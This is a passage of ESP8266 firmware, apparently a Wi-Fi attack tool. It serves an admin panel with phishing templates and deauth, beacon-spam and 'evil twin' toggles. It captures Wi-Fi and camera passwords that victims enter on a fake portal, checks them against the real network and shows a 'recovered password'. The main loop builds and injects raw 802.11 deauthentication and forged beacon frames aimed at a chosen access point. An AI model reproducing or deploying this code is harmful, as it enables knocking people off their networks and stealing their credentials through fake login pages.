    _html += "<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/></svg>PHISHING TEMPLATE</h3>";
    _html += "<form method='post' action='/?settemplate=1' class='radio-group'>";
    _html += "<label style='display:flex; margin-bottom:12px;'><input type='radio' name='tpl' value='0' " + String(current_template == 0 ? "checked" : "") + "> Router Firmware Update</label>";
    _html += "<label style='display:flex; margin-bottom:12px;'><input type='radio' name='tpl' value='1' " + String(current_template == 1 ? "checked" : "") + "> Smart Camera Setup</label>";
    _html += "<button type='submit' class='green' style='margin-top:15px;'>SAVE TEMPLATE</button></form>";
    _html += "</div>";

    // Deauth / Hotspot replacement
    if (deauthing_active) {
      _html.replace("{deauth_button}", "STOP DEAUTH");
      _html.replace("{deauth}", "stop");
      _html.replace("{deauth_class}", "red");
    } else {
      _html.replace("{deauth_button}", "START DEAUTH");
      _html.replace("{deauth}", "start");
      _html.replace("{deauth_class}", "green");
    }
    
    if (rand_beacon_active) {
      _html.replace("{rand_button}", "STOP RAND BEACONS");
      _html.replace("{randbeacon}", "stop");
      _html.replace("{rand_class}", "red");
    } else {
      _html.replace("{rand_button}", "START RAND BEACONS");
      _html.replace("{randbeacon}", "start");
      _html.replace("{rand_class}", "green");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "STOP EVILTWIN");
      _html.replace("{hotspot}", "stop");
      _html.replace("{hotspot_class}", "red");
    } else {
      _html.replace("{hotspot_button}", "START EVILTWIN");
      _html.replace("{hotspot}", "start");
      _html.replace("{hotspot_class}", "green");
    }

    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }
    
    // Wi-Fi Repeater Panel
    _html += "<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M12 3C6.95 3 3.15 4.85 0 7.23L12 22 24 7.23C20.85 4.85 17.05 3 12 3zm0 13c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3z'/></svg>WI-FI REPEATER (NAPT)</h3>";
    if (repeater_error != "") {
      _html += "<div style='background:var(--red); color:#000; padding:10px; border-radius:4px; margin-bottom:15px; font-weight:bold; box-shadow:var(--glow-red); text-transform:uppercase;'>" + repeater_error + "</div>";
    }
    
    if (repeater_active) {
       _html += "<p style='color:var(--green); font-weight:bold; text-shadow:var(--glow-green);'>REPEATER IS CURRENTLY RUNNING!</p>";
       _html += "<form method='post' action='/?repeater=stop'><button class='red'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>STOP REPEATER</button></form>";
    } else {
       _html += "<form method='post' action='/?repeater=start'>";
       
       _html += "<label>SELECT HOME WI-FI:</label>";
       _html += "<select name='hssid'>";
       bool found_any = false;
       for (int i=0; i<16; i++) {
         if (_networks[i].ssid != "") {
           _html += "<option value='" + _networks[i].ssid + "'>" + _networks[i].ssid + "</option>";
           found_any = true;
         }
       }
       if (!found_any) _html += "<option value=''>Scanning... Refresh page</option>";
       _html += "</select>";
       
       _html += "<label>HOME WI-FI PASSWORD:</label><input type='password' name='hpass' required>";
       _html += "<label>EXTENDER NAME (NEW WI-FI):</label><input type='text' name='essid' value='BadCat_EXT' required>";
       _html += "<label>EXTENDER PASSWORD (MIN 8 CHARS):</label><input type='text' name='epass' value='12345678' minlength='8' required>";
       _html += "<button type='submit' class='green'><svg viewBox='0 0 24 24'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z'/></svg>INITIALIZE REPEATER</button></form>";
       _html += "<p style='font-size:12px; color:#5c6b89; margin-top:15px; border-top: 1px dashed rgba(0, 229, 255, 0.3); padding-top: 15px;'>Note: Starting Repeater disables Deauth/Phishing temporarily. Device will auto-connect to Home Wi-Fi and create a new Extender Network.</p>";
    }
    _html += "</div>";

    if (_correct != "") {
      _html += "<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z'/></svg>RECOVERED PASSWORD</h3><p style='color:var(--green);font-size:18px;font-weight:bold;text-shadow:var(--glow-green);'>" + _correct + "</p></div>";
    }

    _html += "</div></body></html>";
    return _html;
}


void handleIndex() {
  bool needs_auth = (webServer.client().localIP() == IPAddress(192, 168, 14, 1));
  if (needs_auth && !is_logged_in && !hotspot_active) {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background:#0f1115;color:#e2e8f0;font-family:sans-serif;text-align:center;padding-top:20%;} input{padding:10px; border-radius:5px; border:1px solid #3b82f6; background:#181b21; color:#fff;} button{padding:10px 20px; background:#3b82f6; color:#fff; border:none; border-radius:5px; cursor:pointer;} </style></head><body><h2>Admin Login</h2><form action='/login' method='POST'><input type='password' name='adminpass' placeholder='Admin Password' required><br><br><button type='submit'>Login</button></form></body></html>");
    return;
  }
  
  handleArgs();
  // if handleArgs caused a redirect
  if (webServer.hasArg("addbeacon") || webServer.hasArg("delbeacon") || webServer.hasArg("settemplate") || webServer.hasArg("check") || webServer.hasArg("repeater")) {
    return;
  }

  if (hotspot_active == false) {
        webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    webServer.sendHeader("Pragma", "no-cache");
    webServer.sendHeader("Expires", "-1");
        webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    webServer.sendHeader("Pragma", "no-cache");
    webServer.sendHeader("Expires", "-1");
    webServer.send(200, "text/html", buildAdminPage());
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.hasArg("cam_password")) {
        _tryCamPassword = webServer.arg("cam_password");
      } else {
        _tryCamPassword = "";
      }
      
      String loadingHtml = "<!DOCTYPE html><html><head><script>var t=0;var i=setInterval(function(){var x=new XMLHttpRequest();x.open('GET','/status',true);x.onload=function(){if(x.responseText!='0'||t>12){window.location.href='/result';}};x.send();t++;},1000);</script><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background:#f2f2f2;color:#333;font-family:Century Gothic, sans-serif;text-align:center;padding-top:20%;}.loader{border:8px solid #ccc;border-top:8px solid #0066ff;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:20px auto;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><h2 style='font-size:24px;color:#333;'>Verifying connection, please wait...</h2><div class='loader'></div></body></html>";
      webServer.send(200, "text/html", loadingHtml);
      // Ensure the HTTP response is fully sent to the browser before changing WiFi modes
      webServer.client().flush();
      delay(500);
      
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      WiFi.disconnect();
      delay(100);
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str());
      
      if (webServer.arg("deauth") == "start") {
        deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", index());
    }
  }
}

void handleAdmin() {
  bool needs_auth = (webServer.client().localIP() == IPAddress(192, 168, 14, 1));
  if (needs_auth && !is_logged_in) {
    webServer.sendHeader("Location", "/", true);
    webServer.send(302, "text/plain", "");
    return;
  }
  
  handleArgs();
  if (webServer.hasArg("addbeacon") || webServer.hasArg("delbeacon") || webServer.hasArg("settemplate") || webServer.hasArg("check") || webServer.hasArg("repeater")) {
    return;
  }
      webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    webServer.sendHeader("Pragma", "no-cache");
    webServer.sendHeader("Expires", "-1");
        webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    webServer.sendHeader("Pragma", "no-cache");
    webServer.sendHeader("Expires", "-1");
    webServer.send(200, "text/html", buildAdminPage());
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;
unsigned long rand_beacon_now = 0;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {
    uint8_t old_ch = wifi_get_channel();
    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    for (int i=0; i<3; i++) {
        deauthPacket[0] = 0xC0;
        wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
        deauthPacket[0] = 0xA0;
        wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
        delay(2);
    }

    wifi_set_channel(old_ch);
    deauth_now = millis();
  }
  
  if (rand_beacon_active && millis() - rand_beacon_now >= 50) {
    uint8_t rand_mac[6];
    for (int i = 0; i < 6; i++) rand_mac[i] = random(256);
    rand_mac[0] &= 0xFE; 

    String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    String rand_ssid = "";
    int ssid_len = random(6, 12);
    for (int i=0; i<ssid_len; i++) {
        rand_ssid += chars[random(chars.length())];
    }
    
    uint8_t current_channel = wifi_get_channel();
    uint8_t packet[128] = {
         0x80, 0x00, 0x00, 0x00,
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
         rand_mac[0], rand_mac[1], rand_mac[2], rand_mac[3], rand_mac[4], rand_mac[5],
         rand_mac[0], rand_mac[1], rand_mac[2], rand_mac[3], rand_mac[4], rand_mac[5],
         0x00, 0x00, 
         0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 
         0x64, 0x00, 
         0x11, 0x04, 
         0x00 
     };
     
     packet[37] = ssid_len;
     for (int j = 0; j < ssid_len; j++) {
         packet[38 + j] = rand_ssid[j];
     }
     int payloadIndex = 38 + ssid_len;
     packet[payloadIndex++] = 0x01; packet[payloadIndex++] = 0x08; packet[payloadIndex++] = 0x82; packet[payloadIndex++] = 0x84;
     packet[payloadIndex++] = 0x8b; packet[payloadIndex++] = 0x96; packet[payloadIndex++] = 0x24; packet[payloadIndex++] = 0x30;
     packet[payloadIndex++] = 0x48; packet[payloadIndex++] = 0x6c;
     packet[payloadIndex++] = 0x03; packet[payloadIndex++] = 0x01; packet[payloadIndex++] = current_channel;
     
     wifi_send_pkt_freedom(packet, payloadIndex, 0);
     rand_beacon_now = millis();
  }

  // Beacon Spam
  if (beacon_spam_active && beacon_count > 0 && millis() - beacon_now >= 100) {
    static uint16_t seq = 0;
    uint8_t current_channel = wifi_get_channel();

    for (int i = 0; i < beacon_count; i++) {
      uint8_t mac[6] = {0x02, 0x24, 0x46, 0x68, (uint8_t)(i % 256), (uint8_t)((i*7) % 256)};
      
      uint8_t packet[128] = {
           0x80, 0x00, 0x00, 0x00,
           0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
           (uint8_t)((seq << 4) & 0xFF), (uint8_t)(seq >> 4),
           0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
           0x64, 0x00,
           0x11, 0x04,
           0x00
       };
       String ssid = beacon_ssids[i];
       int ssidLen = ssid.length();
       packet[37] = ssidLen;
       for (int j = 0; j < ssidLen; j++) {
           packet[38 + j] = ssid[j];
       }
       int payloadIndex = 38 + ssidLen;
       packet[payloadIndex++] = 0x01; packet[payloadIndex++] = 0x08; packet[payloadIndex++] = 0x82; packet[payloadIndex++] = 0x84;
       packet[payloadIndex++] = 0x8b; packet[payloadIndex++] = 0x96; packet[payloadIndex++] = 0x24; packet[payloadIndex++] = 0x30;
       packet[payloadIndex++] = 0x48; packet[payloadIndex++] = 0x6c;
       packet[payloadIndex++] = 0x03; packet[payloadIndex++] = 0x01; packet[payloadIndex++] = current_channel;
       
       wifi_send_pkt_freedom(packet, payloadIndex, 0);
       delay(1);
       yield();
    }
    
    seq++;
    
    beacon_now = millis();
  }

  if (!repeater_active && millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    wifinow = millis();
  }
}
